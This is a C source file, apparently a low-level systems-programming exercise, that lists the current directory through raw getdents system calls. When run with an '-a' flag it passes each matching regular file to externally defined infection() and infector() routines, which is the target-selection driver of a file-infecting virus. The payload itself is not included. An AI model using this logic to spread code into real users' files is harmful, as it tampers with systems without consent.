#include "util.h"
#include "/usr/include/dirent.h"

#define SYSWRITE 4
#define STDOUT 1
#define SYSOPEN 5
#define SYSCLOSE 6
#define SYSREAD 3
#define SYSLSEEK 19
#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2
#define GETDENTS 141
#define STDERR 2
int system_call();

typedef struct ent {
 int inode;
 int offset;
 short len;
 char buf[1];
 
}ent;


extern void infection();
extern void infector( char* fileToInfect);

int main (int argc , char* argv[], char* envp[])
{
  int fd, nread;
  char buf[8192];
  ent *d;
  int bpos;
  char type;
  char * str;
  char c ; /*= (char)argv[2][0];*/
  char c2;
 int i=1;
 int suffix =0;
 int debugmode=0;
 int infected =0;
 
  for(;i<argc;i++)
  {
  if(strncmp(argv[i],"-s",2)==0)
  {
    suffix =1;
    c=argv[i+1][0];
  }
  if(strncmp(argv[i],"-a",2)==0)
  {
   infected =1;
    c2=argv[i+1][0];
  }
  if(strncmp(argv[i],"-d",2)==0)
  {
    debugmode=1;
  }
  }
  
  i=0;
  
  if(debugmode)
  {
    for(; i<argc ;i++)
    {
      system_call(SYSWRITE,STDERR,argv[i],strlen(argv[i]));
      system_call(SYSWRITE,STDERR,"   ",3);
    }
    system_call(SYSWRITE,STDERR,"\n",1);
  }
  
  
  fd= system_call(SYSOPEN,".",0,0777);
  
  for( ; ; )
  {
    nread = system_call(GETDENTS ,fd ,buf ,8192);
    if(nread==-1) 
    {
      break;
      
    }
    if(nread==0) 
    {
      break;
    }
    
    
      
    for(bpos=0 ;bpos<nread;)/*check if we can read more files*/
    {
      d= (ent*)(buf+bpos);/*reading the struct from the stream*/
    
	
      type = *(buf + bpos + d->len - 1); /* getting the type of the file by finding the last character of the struct*/
     
      
      if(suffix)
      {
	if(type == 8 && (*((d->buf)+strlen(d->buf)-1) == c))/*printing iff type of file is DT_REG(which means 8) and the suffix of file is h*/
	{
	system_call(SYSWRITE,STDOUT,"regular",7);
	system_call(SYSWRITE,STDOUT,"   ",3); 
	
	system_call(SYSWRITE,STDOUT,"name:   ",8);
	system_call(SYSWRITE,STDOUT,d->buf,strlen(d->buf));
	system_call(SYSWRITE,STDOUT,"   \n",4);
	}
      
	  if(debugmode)
	  {
	
	system_call(SYSWRITE,STDOUT,"length:   ",10);
	str = itoa(d->len);
	system_call(SYSWRITE,STDOUT,str,strlen(str));
	system_call(SYSWRITE,STDOUT,"   ",3);
	
	  }
      

	  }
      
      
      if(!suffix)
      {
      if(debugmode)
      {
      
      system_call(SYSWRITE,STDOUT,"length:   ",10);
      str = itoa(d->len);
      system_call(SYSWRITE,STDOUT,str,strlen(str));
      system_call(SYSWRITE,STDOUT,"   ",3);
      system_call(SYSWRITE,STDOUT,"name:   ",8);
      system_call(SYSWRITE,STDOUT,d->buf,strlen(d->buf));
      system_call(SYSWRITE,STDOUT,"   \n",4);
      }
      
      }
      
      
      
      
      
      if(infected)
      {
	if(type == 8 && ( *((d->buf)+strlen(d->buf)-1) == c2))
	{
	  infection();
	  infector(d->buf);
	  system_call(SYSWRITE,STDOUT,"name:   ",8);
	  system_call(SYSWRITE,STDOUT,d->buf,strlen(d->buf));
	  system_call(SYSWRITE,STDOUT,"   \n",4);
	}
      }
      /*advance the position of the buffer to the next file*/
      bpos += d->len;
    }
}
  

 
  return 0;
}
